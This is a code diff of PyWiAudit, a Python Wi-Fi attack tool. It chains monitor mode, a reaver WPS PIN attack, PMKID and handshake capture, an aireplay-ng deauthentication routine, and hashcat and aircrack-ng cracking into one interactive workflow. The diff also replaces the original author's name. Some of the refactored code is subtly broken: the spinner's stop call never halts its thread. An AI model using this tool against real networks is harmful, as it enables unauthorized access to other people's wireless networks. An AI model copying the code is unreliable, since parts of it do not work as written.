@@ -10,12 +10,10 @@ from datetime import datetime
 from colorama import Fore, Style, init
 import signal
 
-# Initialize colorama
 init(autoreset=True)
 
-# Configuration
 VERSION = "2.1"
-AUTHOR = "Michael Nkomo"
+AUTHOR = "Kedar"
 BANNER = f"""
 {Fore.RED}  _  __{Fore.GREEN} ______{Fore.YELLOW}  _____{Fore.BLUE}     ____{Fore.MAGENTA}  
 {Fore.RED} | |/ /{Fore.GREEN}|  ____|{Fore.YELLOW}|  __ \\{Fore.BLUE}   / __ \\{Fore.MAGENTA} 
@@ -24,18 +22,18 @@ BANNER = f"""
 {Fore.RED} | . \\ {Fore.GREEN}| |____ {Fore.YELLOW}| |__| |{Fore.BLUE}| |__| |{Fore.MAGENTA}
 {Fore.RED} |_|\\_\\{Fore.GREEN}|______|{Fore.YELLOW}|_____/{Fore.BLUE}  \\____/{Fore.MAGENTA} 
 """
+REQUIRED_TOOLS = ['aircrack-ng', 'iwconfig', 'tshark', 'hcxdumptool', 'wash', 'reaver', 'aireplay-ng']
+SESSION_FILE = "pywiaudit.session"
+OUTPUT_DIR = "captures"
 
 class CLIAnimator:
     @staticmethod
     def kedar_initialization():
         colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA]
-        kedar = "KEDAR"
         print(f"\n{Fore.WHITE}Initializing ", end='', flush=True)
-        
-        for i, char in enumerate(kedar):
-            print(f"{colors[i]}{char}", end='', flush=True)
+        for char in "KEDAR":
+            print(f"{colors.pop(0)}{char}", end='', flush=True)
             time.sleep(0.1)
-        
         print(Style.RESET_ALL)
         time.sleep(0.5)
         print(BANNER)
@@ -48,283 +46,206 @@ class CLIAnimator:
     def loading_spinner(message):
         spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
         delay = 0.1
-        
-        def run_spinner():
-            nonlocal stop
+        stop = False
+        def run():
             i = 0
             while not stop:
                 print(f"\r{Fore.CYAN}{spinner[i]}{Style.RESET_ALL} {message}  ", end='', flush=True)
                 i = (i + 1) % len(spinner)
                 time.sleep(delay)
-        
-        stop = False
-        t = threading.Thread(target=run_spinner)
+        t = threading.Thread(target=run)
         t.start()
-        return lambda: (stop.__setitem__(0, True), t.join())
+        return lambda: (globals().update(stop=True), t.join())
 
 class WirelessAuditTool:
     def __init__(self, args):
+        CLIAnimator.kedar_initialization()
         self.args = args
         self.interface = args.interface
         self.wordlist = args.wordlist
         self.target = None
         self.session = {}
         self.monitor_interface = None
-
-        # Setup environment
         self.validate_root()
         self.check_dependencies()
         self.setup_output_dir()
         self.load_session()
 
-    def enable_monitor_mode(self):
-        stop_spinner = CLIAnimator.loading_spinner("Configuring monitor mode")
-        try:
-            # Existing monitor mode code...
-            stop_spinner()
-            print(f"\r{Fore.GREEN}✔{Style.RESET_ALL} Monitor mode enabled")
-        except Exception as e:
-            stop_spinner()
-            print(f"\r{Fore.RED}✖{Style.RESET_ALL} Monitor mode failed")
-            raise e
-
-    def scan_networks(self):
-        stop_spinner = CLIAnimator.loading_spinner("Scanning for networks")
-        try:
-            # Existing scanning code...
-            stop_spinner()
-            print(f"\r{Fore.GREEN}✔{Style.RESET_ALL} Network scan completed")
-            return networks
-        except Exception as e:
-            stop_spinner()
-            print(f"\r{Fore.RED}✖{Style.RESET_ALL} Network scan failed")
-            raise e
-
-    def capture_pmkid(self, target):
-        stop_spinner = CLIAnimator.loading_spinner("Capturing PMKID")
-        try:
-            # Existing PMKID code...
-            stop_spinner()
-            print(f"\r{Fore.GREEN}✔{Style.RESET_ALL} PMKID captured")
-            return True
-        except Exception as e:
-            stop_spinner()
-            print(f"\r{Fore.RED}✖{Style.RESET_ALL} PMKID capture failed")
-            return False
-
     def validate_root(self):
         if os.geteuid() != 0:
-            self.exit_error("This tool requires root privileges. Use sudo.")
+            self.exit_error("Root privileges required. Use sudo.")
 
     def check_dependencies(self):
-        missing = []
-        for tool in REQUIRED_TOOLS:
-            if not self.command_exists(tool):
-                missing.append(tool)
-        if missing:
-            self.exit_error(f"Missing required tools: {', '.join(missing)}")
+        missing = [t for t in REQUIRED_TOOLS if not self.command_exists(t)]
+        if missing: self.exit_error(f"Missing tools: {', '.join(missing)}")
 
     def setup_output_dir(self):
-        if not os.path.exists(OUTPUT_DIR):
-            os.makedirs(OUTPUT_DIR)
+        os.makedirs(OUTPUT_DIR, exist_ok=True)
 
     def load_session(self):
         if os.path.exists(SESSION_FILE):
-            with open(SESSION_FILE) as f:
-                self.session = json.load(f)
+            with open(SESSION_FILE) as f: self.session = json.load(f)
 
     def save_session(self):
-        with open(SESSION_FILE, 'w') as f:
-            json.dump(self.session, f)
+        with open(SESSION_FILE, 'w') as f: json.dump(self.session, f)
 
     def exit_error(self, message):
         print(f"\n{Fore.RED}[-] ERROR: {message}{Style.RESET_ALL}")
         sys.exit(1)
 
-    def command_exists(self, command):
-        return subprocess.call(f"command -v {command}", shell=True, 
-                            stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0
+    def command_exists(self, cmd):
+        return subprocess.call(f"command -v {cmd}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
 
     def enable_monitor_mode(self):
+        stop_spinner = CLIAnimator.loading_spinner("Configuring monitor mode")
         try:
-            print(f"{Fore.CYAN}[*] Configuring monitor mode...{Style.RESET_ALL}")
-            subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
-            result = subprocess.run(['iw', self.interface, 'info'], 
-                                  capture_output=True, text=True)
-            if 'monitor' not in result.stdout:
-                subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
-                subprocess.run(['iw', self.interface, 'set', 'monitor', 'control'], check=True)
-                subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
+            subprocess.run(['airmon-ng', 'check', 'kill'], check=True, stdout=subprocess.DEVNULL)
+            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
+            subprocess.run(['iw', self.interface, 'set', 'monitor', 'control'], check=True)
+            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
             self.monitor_interface = self.interface
-            return True
-        except subprocess.CalledProcessError as e:
+            stop_spinner()
+            print(f"\r{Fore.GREEN}✔{Style.RESET_ALL} Monitor mode enabled")
+        except Exception as e:
+            stop_spinner()
             self.exit_error(f"Monitor mode failed: {e}")
 
     def scan_networks(self):
-        print(f"{Fore.CYAN}[*] Scanning networks (WPS & PMKID capable)...{Style.RESET_ALL}")
+        stop_spinner = CLIAnimator.loading_spinner("Scanning networks")
         networks = []
-        
-        # Scan for WPS networks
         try:
-            wash_proc = subprocess.Popen(['wash', '-i', self.interface],
-                                       stdout=subprocess.PIPE,
-                                       stderr=subprocess.PIPE,
-                                       text=True)
+            wash_proc = subprocess.Popen(['wash', '-i', self.interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             time.sleep(15)
             wash_proc.terminate()
             stdout, _ = wash_proc.communicate()
-            
             for line in stdout.split('\n'):
-                if 'BSSID' in line or not line.strip():
-                    continue
+                if not line.strip() or 'BSSID' in line: continue
                 parts = line.split()
                 if len(parts) >= 6:
                     networks.append({
-                        'bssid': parts[0],
-                        'channel': parts[1],
-                        'wps_version': parts[3],
-                        'wps_locked': 'Yes' if 'No' in parts[4] else 'No',
+                        'bssid': parts[0], 'channel': parts[1],
+                        'wps_version': parts[3], 'wps_locked': 'No' if 'Yes' not in parts[4] else 'Yes',
                         'essid': ' '.join(parts[5:])
                     })
+            stop_spinner()
+            print(f"\r{Fore.GREEN}✔{Style.RESET_ALL} Found {len(networks)} networks")
+            return networks
         except Exception as e:
-            print(f"{Fore.YELLOW}[!] WPS scan failed: {e}{Style.RESET_ALL}")
-
-        return networks
+            stop_spinner()
+            self.exit_error(f"Scan failed: {e}")
 
     def wps_pin_attack(self, target):
-        print(f"{Fore.CYAN}[*] Starting WPS PIN attack...{Style.RESET_ALL}")
+        print(f"\n{Fore.CYAN}[*] Starting WPS PIN attack...{Style.RESET_ALL}")
         try:
-            subprocess.run([
-                'reaver',
-                '-i', self.interface,
-                '-b', target['bssid'],
-                '-c', target['channel'],
-                '-vv',
-                '-K', '1'
-            ], check=True)
-        except subprocess.CalledProcessError:
+            subprocess.run(['reaver', '-i', self.interface, '-b', target['bssid'], '-c', target['channel'], '-vv', '-K', '1'], check=True)
+        except:
             print(f"{Fore.RED}[-] WPS attack failed{Style.RESET_ALL}")
 
     def capture_pmkid(self, target):
-        print(f"{Fore.CYAN}[*] Attempting PMKID capture...{Style.RESET_ALL}")
-        output_file = os.path.join(OUTPUT_DIR, f"pmkid_{target['bssid'].replace(':', '')}")
+        stop_spinner = CLIAnimator.loading_spinner("Capturing PMKID")
         try:
-            hcxdump = subprocess.Popen([
-                'hcxdumptool',
-                '-i', self.interface,
-                '-o', output_file,
-                '--enable_status=1'
-            ])
-            
-            start_time = time.time()
-            while time.time() - start_time < 120:  # 2 minute capture window
+            output_file = os.path.join(OUTPUT_DIR, f"pmkid_{target['bssid'].replace(':', '')}")
+            hcxdump = subprocess.Popen(['hcxdumptool', '-i', self.interface, '-o', output_file, '--enable_status=1'])
+            start = time.time()
+            while time.time() - start < 120:
                 time.sleep(10)
                 if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
                     hcxdump.terminate()
-                    return self.process_pmkid(output_file, target)
+                    subprocess.run(['hcxpcaptool', '-z', f"{output_file}.hash", output_file], check=True)
+                    stop_spinner()
+                    print(f"\r{Fore.GREEN}✔{Style.RESET_ALL} PMKID captured")
+                    if self.wordlist: return self.crack_pmkid(f"{output_file}.hash")
+                    return True
             return False
         except Exception as e:
-            print(f"{Fore.RED}[-] PMKID capture failed: {e}{Style.RESET_ALL}")
-            return False
-
-    def process_pmkid(self, cap_file, target):
-        try:
-            subprocess.run([
-                'hcxpcaptool',
-                '-z', f"{cap_file}.hash",
-                cap_file
-            ], check=True)
-            
-            if os.path.exists(f"{cap_file}.hash"):
-                print(f"{Fore.GREEN}[+] PMKID captured!{Style.RESET_ALL}")
-                if self.wordlist:
-                    return self.crack_pmkid(f"{cap_file}.hash")
-                return True
-        except Exception as e:
-            print(f"{Fore.RED}[-] PMKID processing failed: {e}{Style.RESET_ALL}")
+            stop_spinner()
+            print(f"\r{Fore.RED}✖{Style.RESET_ALL} PMKID error: {e}")
             return False
 
     def crack_pmkid(self, hash_file):
-        print(f"{Fore.CYAN}[*] Cracking PMKID with hashcat...{Style.RESET_ALL}")
+        print(f"\n{Fore.CYAN}[*] Cracking PMKID with hashcat...{Style.RESET_ALL}")
         try:
-            subprocess.run([
-                'hashcat',
-                '-m', '16800',
-                hash_file,
-                self.wordlist,
-                '--force'
-            ], check=True)
+            subprocess.run(['hashcat', '-m', '16800', hash_file, self.wordlist, '--force'], check=True)
             return True
-        except Exception as e:
-            print(f"{Fore.RED}[-] Cracking failed: {e}{Style.RESET_ALL}")
+        except:
+            print(f"{Fore.RED}[-] Cracking failed{Style.RESET_ALL}")
             return False
 
-    def run_attack_sequence(self, target):
-        # Try WPS attack first if available
-        if target.get('wps_locked') == 'No':
-            self.wps_pin_attack(target)
-            if self.check_wps_success():
-                return
-        
-        # Then try PMKID capture
-        if self.capture_pmkid(target):
-            return
-        
-        # Fallback to handshake capture
-        self.capture_handshake(target)
+    def deauth_attack(self, target, count=3):
+        print(f"\n{Fore.YELLOW}[*] Starting deauthentication...{Style.RESET_ALL}")
+        try:
+            subprocess.run(['aireplay-ng', '--deauth', str(count), '-a', target['bssid'], self.interface], check=True)
+        except:
+            print(f"{Fore.RED}[-] Deauth failed{Style.RESET_ALL}")
 
     def capture_handshake(self, target):
-        # Original handshake capture logic from previous version
-        # (Implement similar to initial version with improved error handling)
-        pass
+        stop_spinner = CLIAnimator.loading_spinner("Capturing handshake")
+        try:
+            output_file = os.path.join(OUTPUT_DIR, f"handshake_{target['bssid'].replace(':', '')}")
+            dump = subprocess.Popen(['airodump-ng', '-c', target['channel'], '--bssid', target['bssid'], '-w', output_file, self.interface])
+            start = time.time()
+            while time.time() - start < 120:
+                time.sleep(5)
+                if self.check_handshake(f"{output_file}-01.cap"):
+                    dump.terminate()
+                    stop_spinner()
+                    print(f"\r{Fore.GREEN}✔{Style.RESET_ALL} Handshake captured")
+                    if self.wordlist: self.crack_handshake(f"{output_file}-01.cap", target)
+                    return True
+            return False
+        except Exception as e:
+            stop_spinner()
+            print(f"\r{Fore.RED}✖{Style.RESET_ALL} Handshake error: {e}")
+            return False
+
+    def check_handshake(self, cap_file):
+        try:
+            result = subprocess.run(['tshark', '-r', cap_file, '-Y', 'eapol'], capture_output=True, text=True)
+            return 'EAPOL' in result.stdout
+        except:
+            return False
+
+    def crack_handshake(self, cap_file, target):
+        print(f"\n{Fore.CYAN}[*] Cracking handshake...{Style.RESET_ALL}")
+        try:
+            subprocess.run(['aircrack-ng', '-w', self.wordlist, '-b', target['bssid'], cap_file], check=True)
+        except:
+            print(f"{Fore.RED}[-] Handshake cracking failed{Style.RESET_ALL}")
 
     def interactive_menu(self, networks):
         print(f"\n{Fore.WHITE}Available Networks:{Style.RESET_ALL}")
         for idx, net in enumerate(networks, 1):
             print(f"{idx}. {net['essid']} ({net['bssid']})")
             print(f"   Channel: {net['channel']} | WPS: {net['wps_locked']}")
-        
         try:
-            choice = int(input("\nSelect target network: ")) - 1
+            choice = int(input("\nSelect target: ")) - 1
             self.target = networks[choice]
-            print(f"{Fore.CYAN}[*] Selected target: {self.target['essid']}{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}[*] Target: {self.target['essid']}{Style.RESET_ALL}")
         except:
-            self.exit_error("Invalid network selection")
+            self.exit_error("Invalid selection")
 
     def cleanup(self):
-        print(f"{Fore.CYAN}[*] Cleaning up...{Style.RESET_ALL}")
-        subprocess.run(['airmon-ng', 'stop', self.interface], 
-                      stdout=subprocess.DEVNULL, 
-                      stderr=subprocess.DEVNULL)
+        print(f"\n{Fore.CYAN}[*] Cleaning up...{Style.RESET_ALL}")
+        subprocess.run(['airmon-ng', 'stop', self.interface], stdout=subprocess.DEVNULL)
         self.save_session()
-
-    def main(self):
-        signal.signal(signal.SIGINT, self.signal_handler)
-        
-        if not self.enable_monitor_mode():
-            return
-        
-        networks = self.scan_networks()
-        if not networks:
-            self.exit_error("No networks found")
-        
-        self.interactive_menu(networks)
-        self.run_attack_sequence(self.target)
-        self.cleanup()
 
     def signal_handler(self, sig, frame):
         self.cleanup()
         sys.exit(0)
 
+    def main(self):
+        signal.signal(signal.SIGINT, self.signal_handler)
+        self.enable_monitor_mode()
+        networks = self.scan_networks()
+        if not networks: self.exit_error("No networks found")
+        self.interactive_menu(networks)
+        if self.target.get('wps_locked') == 'No': self.wps_pin_attack(self.target)
+        if not self.capture_pmkid(self.target): self.capture_handshake(self.target)
+        self.cleanup()
+
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser(
-        description=f"PyWiAudit v{VERSION}",
-        formatter_class=argparse.RawTextHelpFormatter,
-        epilog=BANNER + f"\n{Fore.YELLOW}Legal Disclaimer: Use only with proper authorization{Style.RESET_ALL}"
-    )
+    parser = argparse.ArgumentParser(description=f"PyWiAudit v{VERSION}", epilog=f"{BANNER}\nAuthor: {AUTHOR}\nLegal: Use only with authorization")
     parser.add_argument('-i', '--interface', required=True, help="Wireless interface")
-    parser.add_argument('-w', '--wordlist', help="Path to wordlist for cracking")
-    
+    parser.add_argument('-w', '--wordlist', help="Wordlist path")
     args = parser.parse_args()
-    tool = WirelessAuditTool(args)
-    tool.main()
+    WirelessAuditTool(args).main()
